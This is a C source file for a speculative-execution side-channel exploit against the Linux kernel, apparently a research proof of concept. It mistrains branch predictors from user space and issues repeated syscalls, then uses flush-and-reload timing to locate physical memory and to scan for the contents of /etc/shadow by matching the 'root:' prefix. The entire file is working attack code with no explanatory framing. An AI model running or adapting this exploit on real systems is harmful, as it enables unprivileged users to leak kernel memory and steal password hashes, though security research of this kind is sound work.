#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <time.h>
#include <sched.h>
#include <errno.h>
#include <sys/mman.h>
#include <inttypes.h>
#include <signal.h>
#include <setjmp.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/prctl.h>
#include <string.h>
#include <sys/wait.h>
#include "phys.h"

#define HUGEPAGE 2097152
#define ROUNDS 25000
#define PTRN 0xffff800800000000
#define SETS     1024
#define WAYS     8

#define str(s) #s
#define xstr(s) str(s)

#define WATERMARKING 5500

uint64_t training_jmp;
uint64_t training_call;
uint64_t victim_phantom_call;
int fd;
uint64_t *watermarking_skip;

char fifo[1024];

#define SETS2 1024
#define WAYS2 16
#define SET 276

static inline double elapsed_sec(struct timespec a,
                                 struct timespec b)
{    return (double)(b.tv_sec - a.tv_sec) +
           (double)(b.tv_nsec - a.tv_nsec) * 1e-9;
}

//This creates addresses that collide with the desired kernel locations
//and writes calls/jmps on it
void set_training_addrs(uint64_t jmp_loc, uint64_t call_loc){
    training_jmp = jmp_loc ^ PTRN;
    training_call = call_loc ^ PTRN;
    victim_phantom_call = call_loc;

    mmap((void *)(training_jmp & ~0xfff), 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0);
    mmap((void *)(training_call & ~0xfff), 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0);

    *(uint32_t *)training_jmp = 0x00e0ff41; //jmp *%r8
    *(uint32_t *)training_call = 0x00d0ff41; //call *%r8
}

void unset_training_addrs(){
    munmap((void *)(training_jmp & ~0xfff), 8192);
    munmap((void *)(training_call & ~0xfff), 8192);
}

static inline void insert_p_jmp(){
    asm(
        "pushq $2f\n\t"
        "movq %[br_src], %%rcx\n\t"
        "mov %0, %%r8\n\t"
        "call 1f\n\t"
        "jmp *%%rcx\n\t"
        "1:\n\t"
        "popq %%rax\n\t"
        "clflush (%%rsp)\n\t"
        "ret\n\t"
        "2:\n\t"
        :: "r"(victim_phantom_call), [br_src]"r"(training_jmp): "r8", "rax", "rbx", "rdx", "rcx", "rsi", "rdi", "r9", "r10", "r11", "r14", "r15"
    );
}

static inline void insert_p_call(){
    asm(
        "pushq $2f\n\t"
        "movq %[br_src], %%rcx\n\t"
        "mov %0, %%r8\n\t"
        "call 1f\n\t"
        "jmp *%%rcx\n\t"
        "1:\n\t"
        "popq %%rax\n\t"
        "clflush (%%rsp)\n\t"
        "ret\n\t"
        "2:\n\t"
        :: "r"(victim_phantom_call), [br_src]"r"(training_call): "r8", "rax", "rbx", "rdx", "rcx", "rsi", "rdi", "r9", "r10", "r11", "r14", "r15"
    );
}

static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
    uint64_t lo, hi;
    asm volatile ("CPUID\n\t"
            "RDTSC\n\t"
            "movq %%rdx, %0\n\t"
            "movq %%rax, %1\n\t" : "=r" (hi), "=r" (lo)::
            "%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
    uint64_t lo, hi;
    asm volatile("RDTSCP\n\t"
            "movq %%rdx, %0\n\t"
            "movq %%rax, %1\n\t"
            "CPUID\n\t": "=r" (hi), "=r" (lo):: "%rax",
            "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) void flush_range(long start, long stride, int n) {
    for (uint64_t k = 0; k < n; ++k) {
        volatile void *p = (uint8_t *)start + k * stride;
        __asm__ volatile("clflushopt (%0)\n"::"r"(p));
        __asm__ volatile("clflushopt (%0)\n"::"r"(p));
    }
}

static inline __attribute__((always_inline)) void reload_range(long base, long stride, int n, uint64_t *results) {
	__asm__ volatile("mfence\n");
	for (uint64_t k = 0; k < n; ++k) {
        uint64_t c = ((k*13+9)&(n-1));
	    unsigned volatile char *p = (uint8_t *)base + (stride * c);
		uint64_t t0 = rdtsc();
		*(volatile unsigned char *)p;
		uint64_t dt = rdtscp() - t0;
		if (dt < 150) results[c]++;
	}
}

int compare(const void *a, const void *b) {
    uint64_t ua = *(const uint64_t *)a;
    uint64_t ub = *(const uint64_t *)b;
    return (ua > ub) - (ua < ub);
}

static inline __attribute__((always_inline)) uint64_t reload(unsigned long offset){
    __asm__ volatile("mfence\n");
    unsigned volatile char *p = (uint8_t *)offset;
    uint64_t t0 = rdtsc();
    *(volatile unsigned char *)p;
    uint64_t dt = rdtscp() - t0;
    return dt;
}

int start_interrupts(){
    int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
    if (tfd < 0) {
        perror("timerfd_create");
        exit(1);
    }

    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    struct itimerspec ts = {0};
    ts.it_value = now;
    ts.it_interval.tv_nsec = 5000;

    timerfd_settime(tfd, TFD_TIMER_ABSTIME, &ts, NULL);

    return tfd;
}

void prepare_core(int core){
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    if (sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0) {
        perror("sched_setaffinity");
        exit(1);
    }

    snprintf(fifo, sizeof(fifo), "logs/core%d", core % 8);

    int fdout = open(fifo, O_WRONLY);
    if (fdout < 0) { perror("open"); exit(1); }

    dup2(fdout, STDOUT_FILENO);
    dup2(fdout, STDERR_FILENO);
    close(fdout);

    setvbuf(stdout, NULL, _IONBF, 0);
}

void trigger_syscalls(int tfd, uint64_t r13, uint64_t r14){
    uint64_t exp;
    int ret;

    insert_p_call();
    insert_p_jmp();

    for(int i = 0; i < 1; i++){
        asm volatile(
            "syscall"
            : "=a"(ret)
            : "a"(0),
            "D"(tfd),
            "S"(&exp),
            "d"(8)
            : "rcx","r11","r10","r8","r9","memory", "r12", "r13", "r14"
        );

        for(int j = 0; j < 1; j++){
            insert_p_call();
            insert_p_jmp();

            for(int l = 0; l < 7; l++){
                    asm volatile(
                        "syscall"
                        : "=a"(ret)
                        : "a"(SYSCALL),
                        "D"(0xaaaaaaaaaaaaaa00), "S"(r13), "d"(r14)
                        : "rcx","r11","r10","r8","r9","memory"
                    );
            }
        }
    }
}

int is_hash(uint64_t base, uint64_t _text, uint64_t phys, uint64_t physmap, int core, int tfd, uint64_t addr){
    uint64_t core_offset = core * 4096 * 64 + core * 64 * 8;

    printf("core offset %p\n", (void *)core_offset);
    fflush(stdout);
    
    char target[5] = "root:";

    uint8_t leaked[2] = {0};

    set_training_addrs(_text + 0x123e, _text + 0x12e214c - 3);

    int hits = 0;
    for(int offset = 0; offset < 4; offset++){
        //set_training_addrs(_text + 0x123e, _text + 0x12e214c - 3);

        for (int j = 0; j < 100; j++){
            flush_range(base + core_offset, 64, 1);

            for (int i = 0; i < ROUNDS / 100; i++) {
                trigger_syscalls(tfd, physmap + phys - target[offset] - (target[offset + 1] << 8) + core_offset - 0x6, physmap + addr + offset - 0xb8);
            }                    

            if(reload(base + core_offset) < 150){
                hits++;
                break;
            }
        }

        printf("Hits: %d\n", hits);
        fflush(stdout);
    }   

    printf("\n");

    return !!(hits == 4);
}

int remove_my_pas(uint64_t base, uint64_t _text, uint64_t phys, uint64_t physmap, uint32_t val){
    pid_t pids[CORES];

    int fd_comm[2];
    pipe(fd_comm);

    size_t total_size = sizeof(uint64_t) * CORES * WATERMARKING;

    uint64_t *shared_data = mmap(NULL, total_size, PROT_READ | PROT_WRITE, 
                                MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    if (shared_data == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }

    memset(shared_data, 0, total_size);

    for(int core = 0; core < CORES; core++){        
	//printf("PARENT: Forking core %d\n", core);
        fflush(stdout);
	    pids[core] = fork();
	
        if(pids[core] == 0){
            fflush(stdout);

            prepare_core(core);
            uint64_t core_offset = core * 4096 * 64 + core * 64 * 8;

            printf("HELLO START CORE %d\n", core);
            printf("PID: %d | Parent PID: %d | Core: %d | HELLO START\n", getpid(), getppid(), core);
            fflush(stdout);

            int blocks_per_core = phys_blocks.nblocks / CORES;
            int remainder = phys_blocks.nblocks % CORES;
            
            set_training_addrs(_text + 0x123e, _text + 0x12e2361 - 3);

            int tfd = start_interrupts();

            uint64_t cycles[ROUNDS * 10] = {0};

            int start = core * blocks_per_core + (core < remainder ? core : remainder);
            int end = (core + 1) * blocks_per_core + ((core + 1) < remainder ? (core + 1) : remainder);

            fflush(stdout);
            int got = 0;

            int block = start;
            while(1){
                for (uint64_t k = phys_blocks.blocks[block] * phys_blocks.block_size;
                    k < (phys_blocks.blocks[block] + 1) * phys_blocks.block_size;
                    k += HUGEPAGE) {
                    
                    flush_range(base + core_offset, 64, 1);

                    for (int j = 0; j < ROUNDS / 100; j++) {

                        trigger_syscalls(tfd, physmap + phys - val - 0x8 + core_offset, physmap + k - 0xc0);

                    }

                    cycles[0] = reload(base + core_offset);
                

                    if((k / HUGEPAGE) % 100 == 0){
                        printf("%p: %lu (%lu / %lu, block %d / %d) -- got %d\n", (void *)k, cycles[0], (k - phys_blocks.blocks[block] * phys_blocks.block_size) / 4096, phys_blocks.block_size / 4096, block, phys_blocks.nblocks, got);
                        fflush(stdout);
                    }

                    if(cycles[0] < 150){
                        shared_data[core * WATERMARKING + got] = k;
                        got++;
                    } 
                }

                block++;
                block = block % phys_blocks.nblocks;
                if(block == start) break;
            }

            printf("OKAY GOT ALL. got = %d\n", got);
            fflush(stdout);

            _exit(0);
        }
    }

    for (int i = 0; i < CORES; i++) {
        waitpid(pids[i], NULL, 0);
    }

    qsort(shared_data, CORES * WATERMARKING, sizeof(uint64_t), compare);

    int yes = 0;
    for(int i = 0; i < CORES * WATERMARKING; i++){
        if(shared_data[i]){
            while (i + 1 < CORES * WATERMARKING && shared_data[i] == shared_data[i+1]) {
                i++;
            }
            yes++;
        } 
    }

    //printf("YES: %d\n", yes);
    fflush(stdout);

    watermarking_skip = mmap(NULL, sizeof(uint64_t) * yes, PROT_READ | PROT_WRITE, 
                                MAP_SHARED | MAP_ANONYMOUS, -1, 0);


    memset(watermarking_skip, 0, sizeof(uint64_t) * yes);

    yes = 0;
    for(int i = 0; i < CORES * WATERMARKING; i++){
        if(shared_data[i]){
            int count = 1;
            while (i + 1 < CORES * WATERMARKING && shared_data[i] == shared_data[i+1]) {
                // count++;
                i++;
            }
            watermarking_skip[yes] = shared_data[i];
            yes++;
        } 
    }

    //printf("SECOND YES: %d\n", yes);

    return yes;
}

uint64_t find_shadow(uint64_t base, uint64_t _text, uint64_t phys, uint64_t physmap, uint32_t val, uint32_t val2, int skip){
   pid_t pids[CORES];

    int fd_comm[2];
    pipe(fd_comm);

    for(int core = 0; core < CORES; core++){        
	    pids[core] = fork();
	
        if(pids[core] == 0){
            prepare_core(core);

            uint64_t core_offset = core * 4096 * 64 + core * 64 * 8;

            int blocks_per_core = phys_blocks.nblocks / CORES;
            int remainder = phys_blocks.nblocks % CORES;

            set_training_addrs(_text + 0x123e, _text + 0x12e2361 - 3);

            int tfd = start_interrupts();

            uint64_t cycles[ROUNDS * 10] = {0};

            int start = core * blocks_per_core + (core < remainder ? core : remainder);
            int end = (core + 1) * blocks_per_core + ((core + 1) < remainder ? (core + 1) : remainder);

            printf("core offset %p\n", (void *)core_offset);
            fflush(stdout);

            int skipped = 0;
            int block = start;

            while(1){
                for(int i = 0; i < 10; i++){
                    int printed = 0;
                
                    system("passwd -S >/dev/null 2>&1");

                    int it = -1;

                    for (uint64_t k = phys_blocks.blocks[block] * phys_blocks.block_size;
                        k < (phys_blocks.blocks[block] + 1) * phys_blocks.block_size;
                        k += 4096) {

                        it++;

                        if(k & ~0x1fffffUL == phys) continue;

                        if ((k & 0x1fffff) == 0){
                            int found = 0;
                            for(int i = 0; i < skip; i++){
                                if(watermarking_skip[i] == k){
                                    k += (HUGEPAGE - 4096);
                                    skipped++;
                                    found = 1;
                                    break;
                                }
                            }
                            if(found) continue;
                        }
                    
                        flush_range(base + core_offset, 64, 1);
                        for(int b = 0; b < 1; b++){
                            for (int j = 0; j < 32; j++) {
                                trigger_syscalls(tfd, physmap + phys - val - 0x8 + core_offset, physmap + k - 0xc0);
                            }
                        }
                        
                        uint64_t cycle = reload(base + core_offset);
                        cycles[it] = (cycle < cycles[it] || i == 0) ? cycle : cycles[it];

                        if(it % 100 == 0){ 
                            printf("(%d) %p: %lu / %lu, block %d / %d (total skipped %d)\n", i, (void *)k, (k - phys_blocks.blocks[block] * phys_blocks.block_size) / 4096, phys_blocks.block_size / 4096, block, phys_blocks.nblocks, skipped);
                            fflush(stdout);
                            printed = 1;
                        }

                        if(cycles[it] < 200){
                            fflush(stdout);

                            if(is_hash(base, _text, phys, physmap, core, tfd, k)){
                                printf("\n/etc/shadow found: %p\n", (void *)k);
                                close(fd_comm[0]);
                                write(fd_comm[1], &k, sizeof(k));
                                _exit(0);
                            }else{
				set_training_addrs(_text + 0x123e, _text + 0x12e2361 - 3);
			    }
                        }
                    }
                }
            
                block++;
                if(block >= phys_blocks.nblocks) block = 0;
            }
        }
    }

    int status;
    pid_t finished_pid = wait(&status); 
    
    if (finished_pid > 0) {
	//printf("Child %d finished. I'm moving on now!\n", finished_pid);
    }

    for (int i = 0; i < CORES; i++) {
        if (pids[i] > 0) {
            kill(pids[i], SIGKILL);
            waitpid(pids[i], NULL, 0);
        }
    }

    uint64_t shadow_loc = -1;
    close(fd_comm[1]);
    read(fd_comm[0], &shadow_loc, sizeof(shadow_loc));

    return shadow_loc;
}

uint64_t find_phys(uint64_t base, uint64_t _text, uint64_t physmap){
    pid_t pids[CORES];

    int fd_comm[2];
    pipe(fd_comm);

    for(int core = 0; core < CORES; core++){        
	    pids[core] = fork();
	
        if(pids[core] == 0){
            prepare_core(core);
            uint64_t core_offset = core * 4096 * 64 + core * 64 * 8;

            int blocks_per_core = phys_blocks.nblocks / CORES;
            int remainder = phys_blocks.nblocks % CORES;
            
            set_training_addrs(_text + 0x123e, _text + 0x14f24f2 - 3);

            int tfd = start_interrupts();

            uint64_t cycles[ROUNDS / 5] = {0};

            int start = core * blocks_per_core + (core < remainder ? core : remainder);
            int end = (core + 1) * blocks_per_core + ((core + 1) < remainder ? (core + 1) : remainder);

            for (int block = start; block < end; block++) {
                for (uint64_t k = phys_blocks.blocks[block] * phys_blocks.block_size;
                    k < (phys_blocks.blocks[block] + 1) * phys_blocks.block_size;
                    k += HUGEPAGE) {
                        for (int i = 0; i < ROUNDS / 5; i++) {
                            flush_range(base + core_offset, 4096, 1);
                            
                            trigger_syscalls(tfd, physmap + k + core_offset - 0x20, physmap + k + core_offset - 0x20);
                        
                            cycles[i] = reload(base + core_offset);
                        }

                    qsort(cycles, ROUNDS / 5, sizeof(uint64_t), compare);

                    printf("Lowest cycle = %lu (guess = %p)\n", cycles[0], (void *)k);
                    fflush(stdout);

                    if(cycles[0] < 150){
                        close(fd_comm[0]);
                        write(fd_comm[1], &k, sizeof(k));
                        printf("Physical address found: %p\n", (void *)k);
                        fflush(stdout);
                        _exit(0);
                    }
                }
            }

            while(1){}
        }
    }

    int status;
    pid_t finished_pid = wait(&status); 
    
    if (finished_pid > 0) {
        //printf("Child %d finished. I'm moving on now!\n", finished_pid);
    }

    for (int i = 0; i < CORES; i++) {
        if (pids[i] > 0) {
            kill(pids[i], SIGKILL);
            waitpid(pids[i], NULL, 0);
        }
    }

    uint64_t physical_addr = -1;
    close(fd_comm[1]);
    read(fd_comm[0], &physical_addr, sizeof(physical_addr));

    return physical_addr;
}

int main(int argc, char **argv) {
    srand(time(NULL));

    if (argc != 3) {
        fprintf(stderr, "usage: %s <_text> <physmap>\n", argv[0]);
        return 1;
    }

    phys_blocks_init();
    
    uint64_t base = (uint64_t)aligned_alloc(HUGEPAGE, HUGEPAGE);
	madvise((void *)base, HUGEPAGE, MADV_HUGEPAGE);

    sleep(1);

    for(int j = 0; j < 512; j++) *(volatile uint64_t *)(base + 4096 * j) = 0xAAAAAAAAAAAAAAAA + j;

    madvise((void *)base, HUGEPAGE, MADV_HUGEPAGE);

    sleep(1);

    struct timespec start, end;

    uint64_t _text   = strtoull(argv[1], NULL, 0);
    
    uint64_t physmap = strtoull(argv[2], NULL, 0);

    uint64_t physical_addr = find_phys(base, _text, physmap);

    uint64_t allocations[WATERMARKING];
    for(int i = 0; i < WATERMARKING; i++){
        allocations[i] = (uint64_t)aligned_alloc(HUGEPAGE, HUGEPAGE);
        madvise((void *)allocations[i], HUGEPAGE, MADV_HUGEPAGE);

        *(volatile uint64_t *)(allocations[i]) = 0x8989898989898989;

        for(int j = 1; j < 512; j++) *(volatile uint64_t *)(allocations[i] + j * 4096) = 0x7777777777700000 + i + (j << 12);

        madvise((void *)allocations[i], HUGEPAGE, MADV_HUGEPAGE);
    }

    int skipped;
    while(1){
        skipped = remove_my_pas(base, _text, physical_addr, physmap, 0x89898989);
        if(skipped < WATERMARKING * 0.9){
            printf("Found only %d / %d\n", skipped, WATERMARKING);
    	    fflush(stdout);
    	}
        
        if(skipped >= WATERMARKING * 0.9) break;
    }

    uint64_t ok1 = find_shadow(base, _text, physical_addr, physmap, 0x746f6f72, 0x3a746f6f, skipped);

    printf("Found /etc/shadow: %p\n", (void *)ok1);
    fflush(stdout);

    sleep(1);

    return 0;
}
